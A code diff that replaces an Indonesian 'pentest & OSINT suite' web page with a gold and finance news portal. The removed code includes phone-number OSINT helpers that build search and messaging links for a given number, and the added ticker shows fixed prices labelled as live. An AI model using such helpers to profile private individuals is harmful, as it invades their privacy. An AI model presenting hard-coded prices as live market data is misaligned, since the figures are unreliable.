@@ -1,772 +1,1719 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="id" class="dark">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>M4zk1pL4y ToolS v10.0 — Fullstack Pentest & OSINT Suite</title>
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
-<style>
-:root{--bg:#050505;--acc:#00ff41;--acc2:#ff2d55;--acc3:#00d4ff;--acc4:#ffd400;--dim:#888;--brd:#1a3a1a}
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{background:var(--bg);color:#d8ffd8;font-family:'Courier New',monospace;overflow-x:hidden;width:100%}
-::selection{background:var(--acc);color:#000}
-#bgphoto{position:fixed;inset:0;z-index:0;background:url('file_000000000fa48211b2c09fa64b21f357.png') center/cover no-repeat;opacity:.28;filter:grayscale(50%)}
-#bgshade{position:fixed;inset:0;z-index:1;background:linear-gradient(180deg,rgba(5,5,5,.88),rgba(5,5,5,.96))}
-#bgvideo{position:fixed;inset:0;z-index:0;width:100%;height:100%;object-fit:cover;opacity:.22}
-main{position:relative;z-index:2;max-width:1100px;margin:0 auto;padding:16px}
-@keyframes glitch{0%,91%,100%{transform:none}92%{transform:translate(2px,-1px) skewX(3deg)}94%{transform:translate(-2px,1px)}96%{transform:translate(1px,2px)}}
-@keyframes slidein{from{transform:translateY(12px);opacity:0}to{transform:none;opacity:1}}
-@keyframes pulse{50%{opacity:.4}}
-@keyframes blink{50%{opacity:.2}}
-.scanline{position:fixed;inset:0;z-index:3;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.09) 3px)}
-h1{font-size:clamp(20px,4.5vw,34px);color:var(--acc);text-shadow:0 0 12px rgba(0,255,65,.5);animation:glitch 7s infinite}
-h1 .v{color:var(--acc2)}
-header{border-bottom:1px solid var(--brd);padding:12px 0;margin-bottom:12px}
-.sub{color:var(--dim);font-size:12px}
-.stats{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px;font-size:11px}
-.stats span{border:1px solid var(--brd);padding:4px 10px;color:var(--acc3);animation:slidein .5s}
-.dot{display:inline-block;width:8px;height:8px;background:var(--acc);border-radius:50%;animation:pulse 1.5s infinite;margin-right:4px}
-#nav{display:flex;gap:6px;flex-wrap:wrap;margin:12px 0}
-.tab{border:1px solid var(--brd);padding:6px 12px;cursor:pointer;font-size:12px;color:var(--dim);transition:.15s}
-.tab:hover{border-color:var(--acc);color:var(--acc)}
-.tab.act{background:var(--acc);color:#000;font-weight:bold}
-#search{width:100%;background:#0a0a0a;border:1px solid var(--brd);color:var(--acc);padding:12px;font-family:monospace;font-size:14px;margin:10px 0;transition:.2s}
-#search:focus{outline:none;border-color:var(--acc);box-shadow:0 0 10px rgba(0,255,65,.25)}
-#grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px;margin-top:12px}
-.card{border:1px solid var(--brd);background:rgba(10,20,10,.6);padding:12px;cursor:pointer;transition:.15s;animation:slidein .3s}
-.card:hover{border-color:var(--acc);transform:translateY(-2px);box-shadow:0 0 12px rgba(0,255,65,.2)}
-.card h3{font-size:13px;color:var(--acc);margin-bottom:6px}
-.card p{font-size:11px;color:var(--dim)}
-#modal{position:fixed;inset:0;z-index:50;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.88)}
-#modal.open{display:flex}
-.mbox{background:#070707;border:1px solid var(--acc);max-width:760px;width:94%;max-height:86vh;overflow:auto;padding:16px;animation:slidein .2s}
-.mbox h2{color:var(--acc);font-size:15px;border-bottom:1px solid var(--brd);padding-bottom:8px;margin-bottom:10px;display:flex;justify-content:space-between;gap:12px;align-items:center}
-#mClose{cursor:pointer;color:var(--acc2);font-size:18px}
-.out{white-space:pre-wrap;word-break:break-word;background:#0a0a0a;border:1px solid var(--brd);padding:10px;margin-top:10px;font-size:12px;line-height:1.55;max-height:52vh;overflow:auto}
-.btn{background:var(--acc);color:#000;border:0;padding:8px 14px;font-family:monospace;font-weight:bold;cursor:pointer;margin:6px 4px 0 0;font-size:12px}
-.btn:hover{box-shadow:0 0 10px rgba(0,255,65,.4)}
-.btn2{background:var(--acc3)}
-#toast{position:fixed;bottom:16px;left:16px;z-index:200;max-width:85%;font-size:12px}
-.toastMsg{background:#0a0a0a;border-left:3px solid var(--acc);padding:8px 12px;margin-top:6px;animation:blink 3s}
-.toast-err{border-color:var(--acc2);color:var(--acc2)}
-#disclaimer{position:fixed;inset:0;z-index:9999;background:#000;display:flex;align-items:center;justify-content:center;padding:16px}
-.disc-box{max-width:620px;padding:24px;border:1px solid var(--acc2);background:#050505;box-shadow:0 0 30px rgba(255,45,85,.3)}
-.disc-box h2{color:var(--acc2);font-size:18px;margin-bottom:12px}
-.disc-box p{font-size:12px;line-height:1.7;margin-bottom:10px}
-.disc-box .quote{color:var(--acc);font-weight:bold}
-#agreeBtn{background:var(--acc2);color:#000;font-weight:bold;border:0;padding:10px 18px;cursor:pointer;font-family:monospace;font-size:13px}
-#mzkMute{position:fixed;bottom:12px;right:12px;z-index:300;background:#050505;border:1px solid var(--acc);color:var(--acc);padding:8px 10px;cursor:pointer;font-size:14px}
-footer{margin:30px 0 40px;text-align:center;font-size:11px;color:var(--dim)}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Mazkiplay News - Portal Finansial, Harga Emas, & Berita Pasar Realtime</title>
+    
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#f0fdf4',
+                            100: '#dcfce7',
+                            500: '#22c55e',
+                            600: '#16a34a',
+                            700: '#15803d',
+                            dark: '#030712',
+                            card: '#0f172a',
+                            gold: '#f59e0b',
+                            cyan: '#06b6d4'
+                        }
+                    },
+                    animation: {
+                        'marquee': 'marquee 25s linear infinite',
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite'
+                    },
+                    keyframes: {
+                        marquee: {
+                            '0%': { transform: 'translateX(0%)' },
+                            '100%': { transform: 'translateX(-50%)' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <!-- FontAwesome Icons CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Chart.js CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        body { 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #030712;
+            color: #f3f4f6;
+            overflow-x: hidden;
+        }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+        
+        .glow-gold { box-shadow: 0 0 20px rgba(245, 158, 11, 0.25); }
+        .glow-cyan { box-shadow: 0 0 20px rgba(6, 182, 212, 0.25); }
+        .glow-emerald { box-shadow: 0 0 20px rgba(16, 185, 129, 0.25); }
+        
+        .gradient-text {
+            background: linear-gradient(135deg, #f59e0b 0%, #38bdf8 50%, #a855f7 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .glass-card {
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .glass-card:hover {
+            border-color: rgba(245, 158, 11, 0.4);
+        }
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #030712; }
+        ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #334155; }
+    </style>
 </head>
-<body>
-<div id="bgphoto"></div>
-<video id="bgvideo" autoplay muted loop playsinline preload="auto">
-  <source src="lv_7587046372008889605_20260826104017.mp4" type="video/mp4">
-</video>
-<div id="bgshade"></div>
-<div class="scanline"></div>
-<audio id="bgm" src="Voice_Of_Indonesia_Rio_Silaen_-_Ibu_Pertiwi_(mp3.pm).mp3" loop preload="auto"></audio>
-<button id="mzkMute" onclick="mzkMute()">🔊</button>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col antialiased selection:bg-amber-500 selection:text-slate-950">
 
-<div id="disclaimer">
-  <div class="disc-box">
-    <h2>⚠ DISCLAIMER & PERSETUJUAN ⚠</h2>
-    <p>• Gunakan HANYA pada sistem/aset milik sendiri atau dengan izin tertulis.<br>
-    • Akses tanpa otorisasi = ILEGAL (UU ITE & UU PDP No.27/2022).<br>
-    • Tool ini TIDAK lookup data pribadi via HP / dump database / data breach.<br>
-    • OSINT hanya data publik + verifikasi diri + kewenangan hukum resmi.<br>
-    • Semua hasil tercatat lokal di browser.</p>
-    <p class="quote">"HACK WITH PERMISSION, NOT WITHOUT"</p>
-    <button id="agreeBtn" onclick="mzkEnter()">SETUJU & MASUK (<span id="cd">5</span>)</button>
-  </div>
-</div>
+    <!-- TOP TICKER MARQUEE BAR -->
+    <div class="bg-slate-900/90 border-b border-slate-800/80 text-xs py-2 px-4 flex items-center justify-between gap-4 overflow-hidden z-50">
+        <div class="flex items-center gap-2 font-black text-amber-400 shrink-0 bg-slate-900 z-10 pr-3 shadow-md">
+            <span class="flex h-2 w-2 relative">
+              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75"></span>
+              <span class="relative inline-flex rounded-full h-2 w-2 bg-amber-500"></span>
+            </span>
+            <span class="tracking-wider">LIVE PASAR:</span>
+        </div>
+        
+        <div class="flex-1 overflow-hidden relative">
+            <div id="topTickerMarquee" class="flex items-center gap-8 whitespace-nowrap animate-marquee hover:[animation-play-state:paused]">
+                <span class="inline-flex items-center gap-1.5"><i class="fa-solid fa-coins text-amber-400"></i> Emas Antam: <strong class="text-white" id="tickerGoldPrice">Rp 1.485.000/g</strong> <span class="text-emerald-400 text-xs font-semibold"><i class="fa-solid fa-caret-up"></i> +0.40%</span></span>
+                <span class="inline-flex items-center gap-1.5"><i class="fa-solid fa-chart-line text-cyan-400"></i> IHSG Composite: <strong class="text-white" id="tickerIHSG">7.720,15</strong> <span class="text-emerald-400 text-xs font-semibold"><i class="fa-solid fa-caret-up"></i> +0.18%</span></span>
+                <span class="inline-flex items-center gap-1.5"><i class="fa-solid fa-face-smile text-emerald-400"></i> Sentimen Pasar: <strong class="text-emerald-400">68/100 (Greed)</strong></span>
+                <span class="inline-flex items-center gap-1.5"><i class="fa-solid fa-dollar-sign text-emerald-400"></i> USD/IDR: <strong class="text-white" id="tickerUSDIDR">15.420</strong> <span class="text-rose-400 text-xs font-semibold"><i class="fa-solid fa-caret-down"></i> -0.12%</span></span>
+                <span class="inline-flex items-center gap-1.5"><i class="fa-brands fa-bitcoin text-amber-500"></i> BTC/USD: <strong class="text-white" id="tickerBTC">$64,250</strong> <span class="text-emerald-400 text-xs font-semibold"><i class="fa-solid fa-caret-up"></i> +2.15%</span></span>
+                <span class="inline-flex items-center gap-1.5"><i class="fa-solid fa-kaaba text-amber-300"></i> SAR/IDR (Riyal): <strong class="text-white">Rp 4.112</strong> <span class="text-slate-400 text-xs">(Stabil)</span></span>
+                
+                <!-- Duplicate for seamless infinite loop -->
+                <span class="inline-flex items-center gap-1.5"><i class="fa-solid fa-coins text-amber-400"></i> Emas Antam: <strong class="text-white">Rp 1.485.000/g</strong> <span class="text-emerald-400 text-xs font-semibold"><i class="fa-solid fa-caret-up"></i> +0.40%</span></span>
+                <span class="inline-flex items-center gap-1.5"><i class="fa-solid fa-chart-line text-cyan-400"></i> IHSG Composite: <strong class="text-white">7.720,15</strong> <span class="text-emerald-400 text-xs font-semibold"><i class="fa-solid fa-caret-up"></i> +0.18%</span></span>
+            </div>
+        </div>
 
-<main>
-<header>
-  <h1>M4zk1pL4y ToolS <span class="v">v10.0</span></h1>
-  <div class="sub">Recon · Nmap/Nuclei Builder · OSINT-ID · Payload · Crypto — 100+ modul client-side</div>
-  <div class="stats">
-    <span><i class="dot"></i>ONLINE</span>
-    <span>MODUL: <b id="st-mod">0</b></span>
-    <span>RUNS: <b id="st-run">0</b></span>
-    <span id="st-time"></span>
-  </div>
-</header>
-<input id="search" placeholder="🔍 Cari modul... (Ctrl+K)">
-<div id="nav"></div>
-<div id="grid"></div>
-<footer>M4zk1pL4y ToolS v10.0 — untuk edukasi keamanan & pengujian berizin.</footer>
-</main>
+        <div class="shrink-0 flex items-center gap-3 bg-slate-900 z-10 pl-3">
+            <span id="liveClock" class="font-mono text-slate-400 font-semibold hidden lg:inline">00:00:00 WIB</span>
+            <button onclick="refreshAllData()" class="text-slate-400 hover:text-amber-400 transition p-1" title="Perbarui Data Live">
+                <i class="fa-solid fa-rotate-right" id="refreshSpin"></i>
+            </button>
+        </div>
+    </div>
 
-<div id="modal"><div class="mbox">
-  <h2><span id="mTitle"></span><span id="mClose" onclick="closeModal()">✕</span></h2>
-  <div id="mBody"></div>
-</div></div>
-<div id="toast"></div>
+    <!-- MAIN NAVIGATION HEADER -->
+    <header class="sticky top-0 z-40 bg-slate-900/95 backdrop-blur-md border-b border-slate-800/80 shadow-xl">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16 gap-3">
+                
+                <!-- BRAND LOGO -->
+                <div class="flex items-center gap-3 cursor-pointer shrink-0" onclick="switchTab('dashboard')">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-amber-500 via-amber-400 to-cyan-500 flex items-center justify-center text-slate-950 font-black text-xl shadow-lg glow-gold">
+                        M
+                    </div>
+                    <div>
+                        <div class="font-black text-lg sm:text-xl tracking-tight text-white flex items-center gap-1.5">
+                            MAZKIPLAY <span class="gradient-text font-black">NEWS</span>
+                        </div>
+                        <p class="text-[9px] sm:text-[10px] text-slate-400 font-bold tracking-wider uppercase">Financial & Gold Intelligence</p>
+                    </div>
+                </div>
 
-<script>
-/* ================= CORE ================= */
-function $(id){return document.getElementById(id)}
-function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
-function outBox(b,txt){var d=document.createElement('div');d.className='out';d.textContent=txt||'';(b||$('mBody')).appendChild(d);return d}
-function btn(b,label,fn,cls){var x=document.createElement('button');x.className='btn '+(cls||'');x.textContent=label;x.onclick=fn;b.appendChild(x);return x}
-function toast(msg,err){var d=document.createElement('div');d.className='toastMsg'+(err?' toast-err':'');d.textContent=msg;$('toast').appendChild(d);setTimeout(()=>d.remove(),4500)}
-function bump(){var n=(+localStorage.getItem('mzk_run')||0)+1;localStorage.setItem('mzk_run',n);$('st-run').textContent=n}
-function dload(name,content,type){var a=document.createElement('a');a.download=name;a.href='data:'+(type||'text/plain')+';charset=utf-8,'+encodeURIComponent(content);a.click()}
-function ask(m,d){return prompt(m,d)}
-var TOOLS=[];
-function reg(cat,name,desc,run){TOOLS.push({cat,name,desc,run})}
-function runTool(i){var t=TOOLS[i];if(!t)return;
-  $('mTitle').textContent='['+t.cat+'] '+t.name;
-  $('mBody').innerHTML='<p style="color:var(--dim);font-size:12px">'+esc(t.desc)+'</p>';
-  $('modal').classList.add('open');
-  Promise.resolve(t.run($('mBody'))).catch(e=>toast('[ERR] '+e.message,1))}
-function closeModal(){$('modal').classList.remove('open')}
-window.openCat=openCat;window.runTool=runTool;window.closeModal=closeModal;
-</script>
+                <!-- NAVIGATION LINKS DESKTOP -->
+                <nav class="hidden xl:flex items-center gap-1">
+                    <button onclick="switchTab('dashboard')" id="nav-dashboard" class="nav-btn px-3 py-2 rounded-lg text-xs font-bold transition flex items-center gap-2 bg-slate-800 text-amber-400 border border-amber-500/30">
+                        <i class="fa-solid fa-house"></i> Beranda
+                    </button>
+                    <button onclick="switchTab('emas')" id="nav-emas" class="nav-btn px-3 py-2 rounded-lg text-xs font-semibold text-slate-300 hover:text-white hover:bg-slate-800 transition flex items-center gap-2">
+                        <i class="fa-solid fa-coins text-amber-400"></i> Harga Emas Live
+                    </button>
+                    <button onclick="switchTab('portfolio')" id="nav-portfolio" class="nav-btn px-3 py-2 rounded-lg text-xs font-semibold text-slate-300 hover:text-white hover:bg-slate-800 transition flex items-center gap-2">
+                        <i class="fa-solid fa-vault text-emerald-400"></i> Portofolio & Target
+                    </button>
+                    <button onclick="switchTab('news')" id="nav-news" class="nav-btn px-3 py-2 rounded-lg text-xs font-semibold text-slate-300 hover:text-white hover:bg-slate-800 transition flex items-center gap-2">
+                        <i class="fa-solid fa-newspaper text-cyan-400"></i> Berita Pasar
+                    </button>
+                    <button onclick="switchTab('tradingview')" id="nav-tradingview" class="nav-btn px-3 py-2 rounded-lg text-xs font-semibold text-slate-300 hover:text-white hover:bg-slate-800 transition flex items-center gap-2">
+                        <i class="fa-solid fa-chart-area text-purple-400"></i> Grafik Charting
+                    </button>
+                    <button onclick="switchTab('macro')" id="nav-macro" class="nav-btn px-3 py-2 rounded-lg text-xs font-semibold text-slate-300 hover:text-white hover:bg-slate-800 transition flex items-center gap-2">
+                        <i class="fa-solid fa-globe text-indigo-400"></i> Makro Ekonomi
+                    </button>
+                    <button onclick="switchTab('calc')" id="nav-calc" class="nav-btn px-3 py-2 rounded-lg text-xs font-semibold text-slate-300 hover:text-white hover:bg-slate-800 transition flex items-center gap-2">
+                        <i class="fa-solid fa-robot text-rose-400"></i> AI & Kalkulator
+                    </button>
+                </nav>
 
-<script>
-/* ================= MODUL ================= */
-try{
+                <!-- RIGHT ACTION BUTTONS -->
+                <div class="flex items-center gap-2 shrink-0">
+                    <button onclick="openAiModal()" class="p-2 rounded-xl bg-purple-900/50 border border-purple-500/40 text-purple-300 hover:bg-purple-800/60 transition relative shadow-lg" title="Tanya MazkiAI Market Bot">
+                        <i class="fa-solid fa-robot text-sm"></i>
+                    </button>
 
-/* ---------- API ID (API publik resmi Indonesia) ---------- */
-reg('API-ID','BMKG Gempa Terkini','Gempa terkini dari BMKG',async b=>{
-  try{var j=await(await fetch('https://data.bmkg.go.id/DataMKG/TEWS/gempadirasakan.json')).json();
-  var o=j.Infogempa.gempa.map(x=>'📅 '+x.Tanggal+' '+x.Jam+'\nMagnitudo : '+x.Magnitude+'\nKedalaman: '+x.Kedalaman+'\nLokasi   : '+x.Wilayah+'\nKoordinat: '+x.Coordinates+'\nPotensi  : '+x.Potensi+'\n').join('\n');
-  outBox(b,o)}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('API-ID','BMKG Cuaca Jakarta','Cuaca prakiraan 4 wilayah Jakarta',async b=>{
-  try{var j=await(await fetch('https://data.bmkg.go.id/DataMKG/MEWS/DigitalForecast/DigitalForecast-DKIJakarta.xml')).text();
-  outBox(b,'(XML — tampilkan bagian cuaca di bawah)\n\n'+j.slice(0,3000)+'\n\n(API XML dari BMKG — full data bisa diunduh di data.bmkg.go.id)')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('API-ID','Bank Indonesia Kurs','Kurs mata uang utama BI',async b=>{
-  try{var j=await(await fetch('https://api.frankfurter.app/latest?from=USD&to=IDR')).json();
-  outBox(b,'USD → IDR : '+j.rates.IDR+'\nTanggal   : '+j.date+'\n\n(Sumber Frankfurter — proxy ECB; untuk kurs resmi BI cek https://www.bi.go.id/id/moneter/informasi-kurs/')"')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('API-ID','Jadwal Sholat (Kemenag)','Jadwal sholat via API Aladhan (proxy data Kemenag)',async b=>{
-  var c=ask('Kota (mis. Jakarta, Bandung):','Jakarta');
-  try{var j=await(await fetch('https://api.aladhan.com/v1/timingsByCity?city='+encodeURIComponent(c)+'&country=Indonesia&method=20')).json();
-  var t=j.data.timings;
-  outBox(b,'Jadwal '+c+' ('+j.data.date.readable+')\n\nSubuh   : '+t.Fajr+'\nTerbit  : '+t.Sunrise+'\nDzuhur  : '+t.Dhuhr+'\nAshar   : '+t.Asr+'\nMaghrib : '+t.Maghrib+'\nIsya    : '+t.Isha)}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('API-ID','Data.go.id (CKAN)','Search dataset open data Indonesia',async b=>{
-  var q=ask('Kata kunci dataset:','kesehatan');
-  try{var j=await(await fetch('https://data.go.id/api/3/action/package_search?q='+encodeURIComponent(q)+'&rows=10')).json();
-  var ds=j.result.results;var o=ds.length?ds.map(x=>'📦 '+x.title+'\n   '+x.notes.slice(0,120)+'...\n   https://data.go.id/dataset/'+x.name).join('\n\n'):'(tidak ada)';
-  outBox(b,o)}catch(e){outBox(b,'ERR: '+e.message+'\n(data.go.id kadang butuh CORS; alternatif: https://data.go.id/dataset)')}bump()});
-reg('API-ID','Kode Pos Indonesia','Lookup kode pos via API publik',async b=>{
-  var k=ask('Kelurahan/kota:','Menteng');
-  outBox(b,'Cek manual di:\n\nhttps://kodepos.posindonesia.co.id\nhttps://www.google.com/search?q=kode+pos+'+encodeURIComponent(k)+'\n\nData resmi POS Indonesia tidak punya API publik terbuka; alternatif daftar lengkap:\nhttps://github.com/edwardsamuel/Wilayah-Administratif-Indonesia\nhttps://github.com/klemensz/daftar-alamat-indonesia')});
-reg('API-ID','Wilayah Indonesia (GitHub)','Lookup provinsi/kab/kota dari repo open data',async b=>{
-  try{var j=await(await fetch('https://raw.githubusercontent.com/edwardsamuel/Wilayah-Administratif-Indonesia/master/data/provinsi.json')).json();
-  outBox(b,'Daftar provinsi Indonesia:\n\n'+Object.values(j).map(x=>x.kode+' — '+x.nama).join('\n'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('API-ID','Public API Indonesia Hub','Kumpulan API publik Indonesia',async b=>{
-  outBox(b,`=== API PUBLIK INDONESIA ===
-BMKG (gempa)     : https://data.bmkg.go.id/DataMKG/TEWS/gempadirasakan.json
-BMKG (cuaca)     : https://data.bmkg.go.id/DataMKG/MEWS/DigitalForecast/
-BNPB (bencana)   : https://dinsos.bpbd.jakarta.go.id/apps/bencana/api/
-Bank Indonesia   : https://www.bi.go.id/id/moneter/informasi-kurs/
-Kemenag (sholat) : via api.aladhan.com (method=20 Kemenag)
-Data.go.id       : https://data.go.id/api/3/action/package_search
-Satu Data        : https://satudata.go.id/
-Kemendikbud (Sekolah): https://api-sekolah-indonesia.vercel.app
-KBBI            : https://kbbi-api.tegarutomo.dev
-Wilayah         : https://github.com/edwardsamuel/Wilayah-Administratif-Indonesia
-Jakarta OpenData: https://data.jakarta.go.id`);bump()});
-reg('API-ID','KBBI Lookup','Cari kata di KBBI via API publik',async b=>{
-  var w=ask('Kata:','hacker');if(!w)return;
-  try{var r=await fetch('https://kbbi-api-tegarutomo.vercel.app/'+encodeURIComponent(w));
-  var j=await r.json();
-  outBox(b,'Kata : '+w+'\n\n'+(j.entri?JSON.stringify(j.entri,null,2).slice(0,1500):'(tidak ditemukan)'))}catch(e){outBox(b,'ERR: '+e.message+'\nCoba manual: https://kbbi.kemdikbud.go.id/entri/'+w)}bump()});
-reg('API-ID','Global Public API Hub','Daftar API publik global terkenal',async b=>{
-  outBox(b,`=== API PUBLIK GLOBAL ===
-Ipwho.is        : https://ipwho.is (IP intel)
-DNS over HTTPS  : https://dns.google/resolve
-crt.sh          : https://crt.sh/?q=&output=json
-Wayback         : https://web.archive.org/cdx/search/cdx
-Frankfurter     : https://api.frankfurter.app/latest
-Aladhan         : https://api.aladhan.com
-Nominatim (OSM) : https://nominatim.openstreetmap.org/search?q=&format=json
-OpenWeatherMap  : https://openweathermap.org/api (perlu key gratis)
-HackerNews      : https://hn.algolia.com/api/v1/search?query=
-GitHub          : https://api.github.com/search/users?q=
-ipapi           : https://ipapi.co/json
-NumVerify       : https://numverify.com (perlu key, phone global)
-IpQualityScore  : https://www.ipqualityscore.com (perlu key)
-HaveIBeenPwned  : https://haveibeenpwned.com (perlu key)`)});
-reg('API-ID','Weather Global','Cuaca kota global via Open-Meteo (tanpa key)',async b=>{
-  var c=ask('Kota:','Jakarta');if(!c)return;
-  try{var g=await(await fetch('https://geocoding-api.open-meteo.com/v1/search?name='+encodeURIComponent(c)+'&count=1')).json();
-  if(!g.results||!g.results.length){outBox(b,'Kota tidak ditemukan');return}
-  var r=g.results[0];
-  var w=await(await fetch('https://api.open-meteo.com/v1/forecast?latitude='+r.latitude+'&longitude='+r.longitude+'&current_weather=true')).json();
-  outBox(b,r.name+', '+r.country+'\nSuhu  : '+w.current_weather.temperature+'°C\nAngin : '+w.current_weather.windspeed+' km/h\nKode cuaca: '+w.current_weather.weathercode)}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+                    <button onclick="openPriceAlertModal()" class="p-2 rounded-xl bg-slate-800 border border-slate-700 hover:border-amber-500/50 text-amber-400 transition relative" title="Setel Target Harga Emas & Pasar">
+                        <i class="fa-solid fa-bell text-sm"></i>
+                        <span id="alertBadge" class="absolute -top-1 -right-1 w-2.5 h-2.5 bg-rose-500 rounded-full hidden"></span>
+                    </button>
 
-/* ---------- OSINT PHONE (legal only) ---------- */
-reg('OSINT','Phone Parser Indonesia','Validasi + identifikasi operator dari prefix',async b=>{
-  var p=ask('Nomor HP (mis. 081234567890):','081234567890');if(!p)return;
-  var e164=p.replace(/\D/g,'').replace(/^0/,'62');
-  var pref=e164.slice(0,4);
-  var ops={'62811':'Telkomsel','62812':'Telkomsel','62813':'Telkomsel','62821':'Telkomsel','62822':'Telkomsel','62851':'Telkomsel','62852':'Telkomsel','62853':'Telkomsel','62814':'Telkomsel Hello','62815':'Telkomsel (kartuAs)','62816':'Indosat','62817':'XL Axiata','62818':'XL Axiata','62819':'XL Axiata','62859':'XL','62831':'Indosat IM3','62832':'Indosat IM3','62833':'Indosat IM3','62855':'Indosat','62856':'Indosat','62857':'Indosat','62858':'Indosat','62895':'Tri','62896':'Tri','62897':'Tri','62898':'Tri','62899':'Tri','62881':'Telkomsel','62888':'Smartfren','62887':'Smartfren','62889':'Smartfren','62841':'By.U/Telkomsel','62877':'XL Prioritas','62878':'XL','62866':'Indosat','62823':'Telkomsel','62824':'Telkomsel','62825':'Telkomsel','62826':'Telkomsel','62827':'Telkomsel','62828':'Telkomsel','62829':'Telkomsel','62838':'Telkomsel','62839':'Telkomsel','62847':'Telkomsel','62848':'Telkomsel','62849':'Telkomsel'};
-  var op=ops[pref]||'Operator tidak dikenal / prefix baru';
-  var valid=/^62[0-9]{8,13}$/.test(e164);
-  outBox(b,'Input      : '+p+'\nE.164      : +'+e164+'\nValid      : '+(valid?'✔ ya':'✘ tidak')+'\nPrefix     : '+pref+'\nOperator   : '+op+'\nJumlah digit: '+e164.length+'\n\n⚠ Lookup data pemilik nomor (dukcapil/operator/device/IP/email/sosmed terikat ke nomor) tidak tersedia — itu ilegal (UU PDP 27/2022).\n\nCek lebih lanjut (legal):\n• WhatsApp: https://wa.me/'+e164+'\n• Cek operator global: https://freecarrierlookup.com\n• Libphonenumber (Kali): pip install phonenumbers\n\n  python3 -c "import phonenumbers; n=phonenumbers.parse(\''+e164+'\',\'ID\'); print(phonenumbers.format_number(n,1)); print(phonenumbers.carrier.name_for_number(n,\'id\')); print(phonenumbers.timezone.time_zones_for_number(n))")');
-  bump()});
-reg('OSINT','Phone Global Lookup','Format + country + carrier via libphonenumber-js CDN',async b=>{
-  var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/libphonenumber-js@1.10.49/bundle/min.js';
-  document.head.appendChild(s);
-  await new Promise(r=>s.onload=r);
-  var p=ask('Nomor global (mis. +62812...):','+6281234567890');if(!p)return;
-  try{var pn=libphonenumber.parsePhoneNumber(p);
-  outBox(b,'Valid      : '+pn.isValid()+'\nCountry    : '+pn.country+'\nCalling code: +'+pn.countryCallingCode+'\nNational   : '+pn.formatNational()+'\nInternational: '+pn.formatInternational()+'\nE.164      : '+pn.number+'\nType       : '+pn.getType()+'\nTimezone   : '+(libphonenumber.getCountries?p.meaning||'-':'-')+'\n\n⚠ Tidak ada lookup pemilik/device/IP — itu data operator & ilegal diakses tanpa kewenangan.')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-reg('OSINT','WhatsApp Check','Generate link wa.me untuk cek registrasi manual',async b=>{
-  var p=ask('Nomor (mis. 081234567890):','');if(!p)return;
-  var e164=p.replace(/\D/g,'').replace(/^0/,'62');
-  outBox(b,'Buka link berikut di browser — kalau profil terlihat → nomor aktif WA:\n\nhttps://wa.me/'+e164+'\n\nAtau pakai Kali:\n\n# Cek nomor via wscat / whatsapp-web.js\nnpm install whatsapp-web.js\n\n⚠ Cek manual aman: jangan spam verifikasi OTP milik orang lain — itu illegal & fraud.')});
-reg('OSINT','Phone OSINT Hub','Link OSINT nomor HP yang legal',async b=>{
-  var p=ask('Nomor:','');if(!p)return;
-  var e=p.replace(/\D/g,'').replace(/^0/,'62');
-  outBox(b,'Cari nomor di search engine (hasil publik):\n\nGoogle : https://www.google.com/search?q=%22'+p+'%22\nBing   : https://www.bing.com/search?q=%22'+p+'%22\nDuck   : https://duckduckgo.com/?q=%22'+p+'%22\nX      : https://x.com/search?q='+p+'\nTelegram: https://t.me/+62'+e.replace(/^62/,'')+'\nWhatsApp: https://wa.me/'+e+'\n\n⚠ Gak ada API legal buat lihat device/IP/email/sosmed dari nomor — itu breach data. UU PDP 27/2022.')});
-reg('OSINT','Email Validator','Format + MX record',async b=>{
-  var e=ask('Email:','admin@example.com');if(!e)return;
